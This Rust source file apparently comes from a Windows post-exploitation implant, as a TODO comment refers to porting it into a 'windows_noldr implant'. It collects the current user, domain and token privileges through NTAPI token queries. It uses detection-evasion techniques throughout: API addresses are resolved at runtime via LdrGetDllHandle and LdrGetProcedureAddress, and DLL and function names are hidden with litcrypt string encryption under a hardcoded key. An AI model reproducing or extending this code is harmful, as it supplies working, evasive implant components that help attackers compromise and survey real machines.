use winapi::{
    shared::{
        minwindef::{BOOL, DWORD},
        ntdef::{LPCSTR, LPWSTR, NTSTATUS, PULONG, PVOID, ULONG},
    },
    um::winnt::{TokenPrivileges, TOKEN_PRIVILEGES}};

use ntapi::ntldr::{LdrGetDllHandle, LdrGetProcedureAddress};
use ntapi::ntrtl::{RtlInitUnicodeString, RtlUnicodeStringToAnsiString};

use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;

use winapi::ctypes::c_void as winapi_c_void;
use winapi::shared::minwindef::{FARPROC, HMODULE};
use winapi::shared::ntdef::{STRING, UNICODE_STRING};
use winapi::shared::ntstatus::STATUS_SUCCESS;
use std::ptr;
use winapi::shared::minwindef::LPDWORD;
use winapi::shared::ntdef::{HANDLE, LPCWSTR, PHANDLE};
use winapi::um::winnt::TokenUser;
use winapi::um::winnt::{PSID_NAME_USE, TOKEN_INFORMATION_CLASS, TOKEN_QUERY, TOKEN_USER};
//use windows_sys::Win32::Foundation::BOOL;
use windows_sys::Win32::Foundation::PSID;
use winapi::um::winnt::LUID;

#[macro_use]
extern crate litcrypt2;

use_litcrypt!("ageofmachine");

// Function to get a handle to a DLL module
fn ldr_get_dll(dll_name: &str) -> HMODULE {
    // Initialize a null pointer to a void type
    let mut handle: *mut winapi_c_void = std::ptr::null_mut();
    // Initialize a UNICODE_STRING structure
    let mut unicode_string = UNICODE_STRING {
        Length: 0,
        MaximumLength: 0,
        Buffer: std::ptr::null_mut(),
    };
    // Convert the DLL name to a wide string (UTF-16)
    let dll_name_wide: Vec<u16> = OsStr::new(dll_name).encode_wide().chain(Some(0)).collect();
    unsafe {
        // Initialize the UNICODE_STRING with the DLL name
        RtlInitUnicodeString(&mut unicode_string, dll_name_wide.as_ptr());
        // Get a handle to the DLL
        let status = LdrGetDllHandle(
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            &mut unicode_string as *mut UNICODE_STRING,
            &mut handle,
        );
        // If the function fails or the handle is null, return null
        if status != STATUS_SUCCESS || handle.is_null() {
            return std::ptr::null_mut();
        }
    }
    // Return the handle to the DLL
    handle as HMODULE
}

// Function to get a function address from a DLL module
fn ldr_get_fn(dll: HMODULE, fn_name: &str) -> FARPROC {
    // Initialize a null pointer to a void type
    let mut func: *mut winapi_c_void = std::ptr::null_mut();
    // Initialize an ANSI_STRING structure
    let mut ansi_string = STRING {
        Length: 0,
        MaximumLength: 0,
        Buffer: std::ptr::null_mut(),
    };
    // Initialize a UNICODE_STRING structure
    let mut unicode_string = UNICODE_STRING {
        Length: 0,
        MaximumLength: 0,
        Buffer: std::ptr::null_mut(),
    };
    // Convert the function name to a wide string (UTF-16)
    let fn_name_wide: Vec<u16> = OsStr::new(fn_name).encode_wide().chain(Some(0)).collect();
    unsafe {
        // Initialize the UNICODE_STRING with the function name
        RtlInitUnicodeString(&mut unicode_string, fn_name_wide.as_ptr());
        // Convert the UNICODE_STRING to an ANSI_STRING
        RtlUnicodeStringToAnsiString(&mut ansi_string, &unicode_string, 1);
        // Get the address of the function
        let status = LdrGetProcedureAddress(
            dll as *mut winapi_c_void,
            &mut ansi_string as *mut STRING,
            0,
            &mut func,
        );
        // If the function fails or the function address is null, return null
        if status != STATUS_SUCCESS || func.is_null() {
            return std::ptr::null_mut();
        }
    }
    // Return the function address
    func as FARPROC
}

// This function gets the name of a privilege given its LUID (Locally Unique Identifier).
fn get_privilege_name(luid: LUID) -> String {
    // Initialize the length of the name to 0.
    let mut name_len = 0;

    // Load the kernel32.dll library.
    let kernel32 = ldr_get_dll(&lc!("kernel32.dll"));

    // Get the address of the LoadLibraryA function from kernel32.dll.
    let load_library_a: unsafe extern "system" fn(lpLibFileName: *const i8) -> HMODULE =
        unsafe { std::mem::transmute(ldr_get_fn(kernel32, &lc!("LoadLibraryA"))) };

    // Get the address of the GetProcAddress function from kernel32.dll.
    let get_proc_address: unsafe extern "system" fn(
        hModule: HMODULE,
        lpProcName: *const i8,
    ) -> FARPROC = unsafe { std::mem::transmute(ldr_get_fn(kernel32, &lc!("GetProcAddress"))) };

    // Load the Advapi32.dll library.
    let advapi32 = unsafe { load_library_a("Advapi32.dll\0".as_ptr() as *const i8) };
    if advapi32.is_null() {
        return String::new();
    }

    // Get the address of the LookupPrivilegeNameW function from Advapi32.dll.
    let lookup_privilege_name_w_name = "LookupPrivilegeNameW\0".as_ptr() as *const i8;
    let lookup_privilege_name_w: unsafe extern "system" fn(
        LPCSTR,
        *const LUID,
        LPWSTR,
        PULONG,
    ) -> BOOL =
        unsafe { std::mem::transmute(get_proc_address(advapi32, lookup_privilege_name_w_name)) };

    // First call to LookupPrivilegeNameW to get the required buffer size.
    unsafe {
        lookup_privilege_name_w(std::ptr::null(), &luid, std::ptr::null_mut(), &mut name_len);
    }

    // Create a buffer of the required size.
    let mut name = vec![0u16; name_len as usize];

    // Second call to LookupPrivilegeNameW to get the privilege name.
    let success = unsafe {
        lookup_privilege_name_w(std::ptr::null(), &luid, name.as_mut_ptr(), &mut name_len)
    };

    // If the call fails, return an error message.
    if success == 0 {
        return "LookupPrivilegeNameW failed.".to_string();
    }

    // Convert the name from UTF-16 to a Rust String and return it.
    String::from_utf16(&name).unwrap_or_else(|_| String::new())
}
//TODO: copy this module into the windows_noldr implant and convert it to using noldr functions
// This function gets the username of the current user using the NTAPI.
pub fn get_username_ntapi() -> Result<String, &'static str> {
    unsafe {
        // Load the kernel32.dll and ntdll.dll libraries.
        let kernel32 = ldr_get_dll(&lc!("kernel32.dll"));
        if kernel32.is_null() {
            return Err("Failed to load kernel32.dll");
        }

        let ntdll = ldr_get_dll(&lc!("ntdll.dll"));
        if ntdll.is_null() {
            return Err("Failed to load ntdll.dll");
        }

        // Get the addresses of the LoadLibraryA and GetProcAddress functions from kernel32.dll.
        let load_library_a: unsafe extern "system" fn(lpLibFileName: *const i8) -> HMODULE =
            std::mem::transmute(ldr_get_fn(kernel32, &lc!("LoadLibraryA")));

        let get_proc_address: unsafe extern "system" fn(
            hModule: HMODULE,
            lpProcName: *const i8,
        ) -> FARPROC =
            std::mem::transmute(ldr_get_fn(kernel32, &lc!("GetProcAddress")));

        // Get the address of the NtOpenProcessToken function from ntdll.dll.
        let open_process_token: unsafe extern "system" fn(HANDLE, DWORD, PHANDLE) -> NTSTATUS =
            std::mem::transmute(ldr_get_fn(ntdll, &lc!("NtOpenProcessToken")));
        if open_process_token as usize == 0 {
            return Err("Failed to get NtOpenProcessToken function pointer");
        }

        // Get the address of the NtQueryInformationToken function from ntdll.dll.
        let get_token_information: unsafe extern "system" fn(
            HANDLE,
            TOKEN_INFORMATION_CLASS,
            PVOID,
            ULONG,
            PULONG,
        ) -> NTSTATUS = std::mem::transmute(ldr_get_fn(ntdll, &lc!("NtQueryInformationToken")));

        // Load the advapi32.dll library.
        let advapi32 = load_library_a("Advapi32.dll\0".as_ptr() as *const i8);
        if advapi32.is_null() {
            return Err("Failed to load advapi32.dll");
        }

        // Get the address of the LookupAccountSidW function from advapi32.dll.
        let lookup_account_sid_w_name = "LookupAccountSidW\0".as_ptr() as *const i8;
        let lookup_account_sid_w: unsafe extern "system" fn(
            LPCWSTR,
            PSID,
            LPWSTR,
            LPDWORD,
            LPWSTR,
            LPDWORD,
            PSID_NAME_USE,
        ) -> BOOL = std::mem::transmute(get_proc_address(advapi32, lookup_account_sid_w_name));

        if lookup_account_sid_w as usize == 0 {
            return Err("Failed to get LookupAccountSidW function pointer");
        }

        // Get the address of the GetCurrentProcess function from kernel32.dll.
        let get_current_process: unsafe extern "system" fn() -> HANDLE =
            std::mem::transmute(ldr_get_fn(kernel32, &lc!("GetCurrentProcess")));
        if get_current_process as usize == 0 {
            return Err("Failed to get GetCurrentProcess function pointer");
        }

        // Get a handle to the current process.
        let current_process = get_current_process();
        if current_process.is_null() {
            return Err("GetCurrentProcess failed");
        }

        // Open a handle to the access token associated with the current process.
        let mut token: HANDLE = ptr::null_mut();
        let status = open_process_token(current_process, TOKEN_QUERY, &mut token);
        if status != 0x00000000 {
            return Err("NtOpenProcessToken failed");
        }

        // Initialize the length of the return value to 0.
        let mut return_length = 0;

        // First call to GetTokenInformation to get the required buffer size.
        if get_token_information(token, TokenUser, ptr::null_mut(), 0, &mut return_length) == 0 {
            return Err("First GetTokenInformation failed.".into());
        }
        
        // Create a buffer of the required size.
        let mut token_user_buffer = vec![0u8; return_length as usize];
        
        // Second call to GetTokenInformation to get the TOKEN_USER.
        if get_token_information(
            token,
            TokenUser,
            token_user_buffer.as_mut_ptr() as *mut winapi_c_void,
            return_length,
            &mut return_length,
        ) != 0 {
            return Err("Second GetTokenInformation failed.".into());
        }
        
        // Create a buffer of the required size.
        let _token_privileges_buffer = vec![0u8; return_length as usize];
        
        // Third call to GetTokenInformation to get the required buffer size.
        let mut return_length: DWORD = 0;
        if get_token_information(
            token,
            TokenPrivileges,
            ptr::null_mut(),
            0,
            &mut return_length,
        ) == 0 {
            return Err("Third GetTokenInformation for privileges failed.".into());
        }
        
        // Create a buffer of the required size.
        let mut token_privileges_buffer = vec![0u8; return_length as usize];
        
        // Fourth call to GetTokenInformation to get the TOKEN_PRIVILEGES.
        if get_token_information(
            token,
            TokenPrivileges,
            token_privileges_buffer.as_mut_ptr() as *mut winapi_c_void,
            return_length,
            &mut return_length,
        ) != 0 {
            return Err("Fourth GetTokenInformation for privileges failed.".into());
        }
        let token_privileges = token_privileges_buffer.as_ptr() as *mut TOKEN_PRIVILEGES;

        // Get the count of privileges in the token.
        let privilege_count = (*token_privileges).PrivilegeCount;

        // Initialize a string to hold the names of the privileges.
        let mut privilege_names = String::new();
        
        // For each privilege in the token, get its name and append it to the string.
        for i in 0..privilege_count {
            let privilege = *(*token_privileges).Privileges.as_ptr().offset(i as isize);
            let name = get_privilege_name(privilege.Luid);
            privilege_names.push_str(&name);
            privilege_names.push_str("\n");
        }

        // Get the SID (Security Identifier) of the user associated with the token.
        let token_user = token_user_buffer.as_ptr() as *mut TOKEN_USER;
        let user_sid = (*token_user).User.Sid;

        // Initialize buffers to hold the name and domain of the user.
        let mut name = [0u16; 256];
        let mut name_len = 256;
        let mut domain = [0u16; 256];
        let mut domain_len = 256;
        let mut sid_name_use = 0;

        // Call LookupAccountSidW to get the name and domain of the user.
        if lookup_account_sid_w(
            ptr::null(),
            user_sid as PSID,
            name.as_mut_ptr(),
            &mut name_len,
            domain.as_mut_ptr(),
            &mut domain_len,
            &mut sid_name_use,
        ) == 0
        {
            return Err("LookupAccountSidW failed");
        }

        // Convert the name from UTF-16 to a Rust String.
        let username = String::from_utf16_lossy(&name[..name_len as usize]);

        //Convert the domain from UTF-16 to a Rust String.
        let domain_name = String::from_utf16_lossy(&domain[..domain_len as usize]);

        //append a \ to the end of the domain name
        let domain_name: String = domain_name + "\\";

        // Append a newline to the end of the username.
        let username: String = "\n".to_owned() + &domain_name + &username + "\n";

        // Combine the username and the privilege names into a single string.
        let full_string = format!("{}{}", username, privilege_names);
        Ok(full_string)
    }
}